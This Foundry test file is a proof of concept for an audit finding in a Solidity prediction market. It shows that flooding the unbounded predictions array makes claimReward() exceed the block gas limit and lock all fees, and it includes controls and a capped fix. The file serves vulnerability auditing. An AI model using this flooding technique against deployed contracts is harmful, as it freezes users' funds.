// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    PredictionMarket,
    PredictionMarketFixed,
    MockUSDC,
    LockMarker,
    Trader
} from "./62470-h-01-claimreward-can-dos-by-iterating-predictions-blocking-f.sol";

// Finding 62470 (MCP, Pashov): claimReward() iterates the unbounded, attacker-
// inflatable predictions[] array. Once large enough the loop exceeds the block
// gas limit, so the winner can never claim and every prediction fee is locked.
contract ClaimRewardUnboundedLoopDoSTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant FEE = 5e6;

    // ── HARM: an inflated round permanently locks all fees; winner can't claim ──
    function test_exploit_unboundedPredictionsDoSLocksFees() public {
        Exploit e = new Exploit();
        e.run();

        // The winner's claim, capped at a realistic 30M block gas limit, OOG-reverts.
        assertTrue(e.claimReverted(), "claim should OOG-revert under block gas limit");

        // The winner received nothing.
        assertEq(e.winnerBalanceAfter(), 0, "winner must receive nothing");

        // Every 5-USDC fee (25000 attacker + 1 victim) is stranded in the contract.
        uint256 expectedLocked = (25_000 + 1) * FEE; // 25,001 fees x 5 USDC = 125,005 USDC
        assertEq(e.lockedFees(), expectedLocked, "all prediction fees locked");

        // Real tokens are truly stuck: the vulnerable contract still holds the pool.
        MockUSDC usdc = MockUSDC(e.usdcAddr());
        assertEq(usdc.balanceOf(e.marketAddr()), expectedLocked, "market still holds locked pool");

        // Harm magnitude recorded on the marker token at the SINK.
        LockMarker marker = LockMarker(e.markerAddr());
        assertEq(marker.balanceOf(SINK), expectedLocked, "marker records locked amount at SINK");
        assertEq(e.sinkMarkerBalance(), expectedLocked, "sink marker balance exposed");
    }

    // ── CONTROL 1: an identical but SMALL round claims fine and pays the winner ──
    // Proves the harm is caused by the unbounded array SIZE, not a logic defect.
    function test_control_smallRoundClaimsAndPays() public {
        Exploit e = new Exploit();
        e.runControl();

        assertTrue(e.controlClaimSucceeded(), "small-round claim should succeed");
        assertGt(e.controlWinnerPayout(), 0, "winner should be paid in a small round");
    }

    // ── CONTROL 2: the fixed contract caps predictions, so claims always succeed ──
    function test_control_fixedCapPreventsDoS() public {
        MockUSDC usdc = new MockUSDC();
        PredictionMarketFixed market = new PredictionMarketFixed();
        market.openMarketRound(1, address(usdc), 100);

        uint256 cap = market.MAX_PREDICTIONS(); // 500

        // A winner makes one bullish prediction.
        address winner = address(0xBEEF);
        usdc.mint(winner, FEE);
        vm.startPrank(winner);
        usdc.approve(address(market), type(uint256).max);
        market.predict(1, true);
        vm.stopPrank();

        // Attacker tries to flood, but the cap stops it after MAX_PREDICTIONS total.
        address attacker = address(0xA11CE);
        usdc.mint(attacker, cap * FEE);
        vm.startPrank(attacker);
        usdc.approve(address(market), type(uint256).max);
        for (uint256 i = 0; i < cap - 1; i++) {
            market.predict(1, true); // fills the round up to the cap (winner + cap-1)
        }
        // The next prediction is rejected by the fix.
        vm.expectRevert(bytes("Round is full"));
        market.predict(1, true);
        vm.stopPrank();

        // Round resolves bullish; the winner can claim within the block gas limit.
        market.endRound(1, 0, 200);

        vm.prank(winner);
        (bool ok, ) = address(market).call{gas: 30_000_000}(
            abi.encodeWithSelector(PredictionMarketFixed.claimReward.selector, uint256(1), uint256(0))
        );
        assertTrue(ok, "bounded claim must succeed under block gas limit");
        assertGt(usdc.balanceOf(winner), 0, "winner is paid when the array is bounded");
    }
}
